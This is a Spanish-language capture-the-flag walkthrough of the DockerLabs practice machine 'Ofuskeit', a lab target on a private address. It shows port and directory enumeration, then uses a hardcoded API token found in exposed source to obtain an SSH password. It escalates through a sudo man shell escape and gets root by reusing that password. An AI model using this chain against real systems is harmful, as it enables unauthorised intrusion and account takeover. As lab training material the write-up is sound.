# DockerLabs - Ofuskeit Machine Writeup

**Máquina:** Ofuskeit  
**Dificultad:** Fácil-Media  
**Plataforma:** DockerLabs  
**Fecha:** Junio 2025  

---

## Reconocimiento

### Escaneo de Red

Iniciamos con un escaneo de puertos para identificar servicios activos:

```bash
nmap -sV -sC -T4 172.17.0.2
```

**Resultado:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
3000/tcp open  http    Node.js Express framework
```

**Servicios identificados:**
- **SSH (22/tcp)** - OpenSSH 9.2p1
- **HTTP (80/tcp)** - Apache 2.4.62
- **HTTP (3000/tcp)** - Node.js/Express

---

## Enumeración de Servicios

### Puerto 80 - Servidor Web Apache

Accedemos al servicio web principal:

```bash
curl http://172.17.0.2/
```

La página principal muestra contenido estático sobre "Servicios de Mantenimiento Informático" y referencia un archivo `script.js`.

#### Enumeración de Directorios

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js
```

**Archivos encontrados:**
- `/script.js` (200)
- `/api.js` (200)
- `/javascript/` (301 - Redirect)

### Puerto 3000 - Node.js Express

```bash
curl -I http://172.17.0.2:3000/
```

**Respuesta:**
```
HTTP/1.1 404 Not Found
X-Powered-By: Express
```

El servidor Express está activo pero no sirve contenido en la ruta raíz.

---

## Análisis del Código Fuente

### Descarga y Análisis de script.js

```bash
curl http://172.17.0.2/script.js -o script.js
```

Al examinar `script.js`, encontramos código JavaScript ofuscado. Tras el proceso de desofuscación, determinamos que no contiene información crítica para el ataque.

### Descarga y Análisis de api.js

```bash
curl http://172.17.0.2/api.js -o api.js
```

**Contenido de api.js:**
```javascript
const express = require('express');
const app = express();
const PORT = 3000;

// Token válido hardcodeado
const tokenValido = "EKL56L4K57657JÑ456J74K5Ñ6754";

app.use(express.json());

app.post('/api', (req, res) => {
  const { token } = req.body;

  if (token === tokenValido) {
    return res.send("✅ Acceso concedido. Contraseña chocolate123");
  } else {
    return res.status(401).send("❌ Token inválido.");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 API activa en http://localhost:${PORT}`);
});
```

**Información crítica extraída:**
- **Token válido:** `EKL56L4K57657JÑ456J74K5Ñ6754`
- **Endpoint:** `POST /api`
- **Credenciales reveladas:** Contraseña `chocolate123`

---

## Obtención de Credenciales

### Explotación de la API

Con el token descubierto, realizamos una petición POST al endpoint `/api`:

```bash
curl -s -X POST http://172.17.0.2:3000/api \
  -H "Content-Type: application/json" \
  -d '{"token":"EKL56L4K57657JÑ456J74K5Ñ6754"}'
```

**Respuesta:**
```
✅ Acceso concedido. Contraseña chocolate123
```

La API confirma que el token es válido y revela la contraseña `chocolate123`.

---

## Acceso Inicial

### Conexión SSH como admin

Con las credenciales obtenidas, intentamos acceso SSH:

```bash
ssh admin@172.17.0.2
```

**Password:** `chocolate123`

✅ **Acceso exitoso como usuario `admin`**

---

## Escalada de Privilegios

### Enumeración de Privilegios sudo

```bash
sudo -l
```

**Resultado:**
```
Matching Defaults entries for admin on b0c9284eeeba:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User admin may run the following commands on b0c9284eeeba:
    (balulito) NOPASSWD: /usr/bin/man
```

**Hallazgo crítico:** El usuario `admin` puede ejecutar `/usr/bin/man` como el usuario `balulito` sin contraseña.

### Explotación de sudo man (GTFOBins)

Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/man/), identificamos que `man` puede ser explotado para obtener una shell:

```bash
sudo -u balulito man man
```

Una vez dentro del manual, ejecutamos:
```bash
!/bin/sh
```

**Resultado:** Shell como usuario `balulito`

```bash
balulito@b0c9284eeeba:/home/admin$ whoami
balulito
```

### Enumeración como balulito

Como usuario `balulito`, realizamos enumeración adicional buscando vectores de escalada de privilegios:

#### Búsqueda de archivos SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Resultado:**
```
/tmp/bashroot
/usr/bin/umount
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Los archivos SUID encontrados son los estándar del sistema. El archivo `/tmp/bashroot` fue resultado de intentos previos pero no tiene permisos útiles.

#### Búsqueda de capabilities

```bash
getcap -r / 2>/dev/null
```

**Resultado:** *(Sin output - no hay capabilities especiales configuradas)*

#### Verificación de servicios como root

```bash
netstat -tunlp 2>/dev/null | grep root
```

**Resultado:** *(Sin output - no hay servicios ejecutándose como root que podamos explotar)*

#### Revisión de archivos de configuración

Explorando el directorio `/var/www/html`, encontramos un repositorio git:

```bash
cat /var/www/html/.git/config
```

**Resultado:**
```ini
[user]
    name = balulito
    email = admin@empresa.com
    password = 'this is top secret'
```

Encontramos una contraseña potencial: `this is top secret`. Probamos esta credencial para escalar a root:

```bash
su root
```

**Password:** `this is top secret`

❌ **La contraseña no funciona**

Al no encontrar vectores obvios de escalada y fallar con la contraseña encontrada en git, decidimos probar reutilización de credenciales.

---

## Acceso Root

### Reutilización de Credenciales

Recordando que la contraseña `chocolate123` funcionó para el usuario `admin`, decidimos probar la misma credencial para `root`:

```bash
su root
```

**Password:** `chocolate123`

✅ **Escalada exitosa a root**

```bash
root@b0c9284eeeba:/home/admin# whoami
root
```

### Verificación

```bash
root@b0c9284eeeba:/home/admin# id
uid=0(root) gid=0(root) groups=0(root)
```

**¡Compromiso completo de la máquina!**
